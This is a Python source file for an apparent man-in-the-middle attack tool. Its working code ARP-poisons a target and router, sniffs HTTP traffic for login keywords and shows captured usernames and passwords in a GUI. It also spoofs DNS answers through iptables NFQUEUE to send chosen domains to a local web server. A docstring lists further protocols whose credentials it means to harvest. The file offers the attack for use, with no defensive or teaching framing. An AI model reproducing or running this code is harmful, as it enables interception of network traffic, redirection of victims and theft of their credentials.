import scapy.all as scapy
from scapy.all import IP, DNSRR, DNSQR, DNS, UDP
from scapy.layers import http
import time
import threading
import os
import requests
from netfilterqueue import NetfilterQueue
import socket
from requests_toolbelt.utils import dump
import httpserver

class Mitm:

    def __init__(self, interface, router, gui):
        self.interface = interface
        self.router = router
        self.gui = gui
        self.__running = False

    def start_mitm(self, target):
        t_mitm = threading.Thread(target=self.__spoof, args=[target])
        t_mitm.start()
        print("sniff")
        scapy.sniff(prn=self.intersting_info, filter=("host " + target.get_ip()), store=0, stop_filter=self.stop_sniff)
        
    def start_dns(self, target, domain):
        
        t_mitm = threading.Thread(target=self.__spoof, args=[target])
        t_mitm.start()
        
        self.__dns_spoof(domain)
            
    def __spoof(self, target):
        self.__running = True

        target_ip = target.get_ip()
        target_mac = target.get_mac()
        router_ip = self.router.get_ip()
        router_mac= self.router.get_mac()
        interface_mac = self.interface.get_mac()

        self.interface.port_forwarding_on()
        while self.__running:
            self.interface.send_packet(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac , psrc=router_ip, hwsrc=interface_mac))
            self.interface.send_packet(scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=interface_mac))
            time.sleep(2)
    
    def stop(self):
        self.__running = False
        self.interface.port_forwarding_off()
        os.system("iptables --flush")
    
    def stop_sniff(self, pkt):
        return not self.__running
        
    def __dns_spoof(self, domain):
        
        dns_hosts = {
                    str(domain+".").encode(): "192.168.14.165",
                    b"ajwa.com.": "192.168.14.165",
                    b"sigray.com.": "192.168.14.165"
                }
        print(dns_hosts)
        
        def process_packet(packet):
            scapy_packet = IP(packet.get_payload())
            if scapy_packet.haslayer(DNSRR):
                print("[Before]:", scapy_packet.summary())
                try:
                    scapy_packet = modify_packet(scapy_packet)
                except IndexError:
                    pass
                print("[After ]:", scapy_packet.summary())
                packet.set_payload(bytes(scapy_packet))
            packet.accept()


        def modify_packet(packet):
            qname = packet[DNSQR].qname
            if qname not in dns_hosts:
                print("no modification:", qname)
                return packet

            packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
            packet[DNS].ancount = 1
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum
            return packet
        
        if self.__running:
            
            t_mitm = threading.Thread(target=httpserver.main)
            t_mitm.start()
                        
            QUEUE_NUM = 0
            os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
            queue = NetfilterQueue()
            queue.bind(QUEUE_NUM, process_packet)
            queue.run()

    
    
    def intersting_info(self, pkt): # passwords, cookies, browser history, etc.

        if pkt.haslayer(http.HTTPRequest):
            if pkt.haslayer(scapy.Raw):
                load = pkt[scapy.Raw].load
                keywords = ["username", "user", "login", "password", "pass", "usr", "pwd", "email"]
                for keyword in keywords:
                    if keyword.encode() in load:
                        print(load.decode())
                        self.gui.display(load.decode())
        """URLs visited
POST loads sent
HTTP form logins/passwords
HTTP basic auth logins/passwords
HTTP searches
FTP logins/passwords
IRC logins/passwords
POP logins/passwords
IMAP logins/passwords
Telnet logins/passwords
SMTP logins/passwords
SNMP community string
NTLMv1/v2 all supported protocols: HTTP, SMB, LDAP, etc.
Kerberos"""


    
